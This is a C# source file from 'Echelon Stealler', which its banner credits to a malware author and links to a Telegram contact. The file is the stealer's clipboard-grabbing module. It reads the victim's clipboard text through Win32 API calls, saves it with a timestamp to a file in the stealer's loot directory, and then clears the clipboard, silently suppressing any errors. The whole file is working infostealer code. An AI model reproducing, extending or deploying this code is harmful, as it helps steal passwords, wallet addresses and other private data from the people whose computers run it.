///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.IO;
using System.Windows;
using System.Runtime.InteropServices;

namespace Echelon
{
    public static class BuffBoard
    {
        public static void GetClipboard(string Echelon_Dir)
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", $"[{Help.date}]\r\n\r\n{ClipboardNative.GetText()}\r\n\r\n");
                    NativeMethods.EmptyClipboard();
                }
                else
                {
                    return;
                }
            }
            catch { }

        }
    }

    internal static class ClipboardNative
    {
        private const uint CF_UNICODETEXT = 0xD;

        public static string GetText()
        {
            if (NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT) && NativeMethods.OpenClipboard(IntPtr.Zero))
            {
                string data = string.Empty;
                IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
                if (!hGlobal.Equals(IntPtr.Zero))
                {
                    IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
                    if (!lpwcstr.Equals(IntPtr.Zero))
                    {
                        try
                        {
                            data = Marshal.PtrToStringUni(lpwcstr);
                            NativeMethods.GlobalUnlock(lpwcstr);
                        }
                        catch { }
                    }
                }
                NativeMethods.CloseClipboard();
                return data;
            }
            return null;
        }
    }
}
